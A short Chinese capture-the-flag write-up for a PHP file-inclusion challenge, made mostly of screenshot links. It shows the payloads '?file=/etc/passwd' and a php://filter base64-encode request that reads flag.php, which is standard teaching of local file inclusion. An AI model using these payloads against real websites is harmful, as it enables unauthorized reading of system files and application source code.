![image-20250403165338607](./assets/image-20250403165338607.png)

提示传入file参数



尝试传入/etc/passwd

```
?file=/etc/passwd
```

![image-20250403165403006](./assets/image-20250403165403006.png)

提示flag在flag.php中



### 第一种

利用php://filter读取

```
?file=php://filter/convert.base64-encode/resource=flag.php
```

![image-20250403165514815](./assets/image-20250403165514815.png)

![image-20250403165531469](./assets/image-20250403165531469.png)





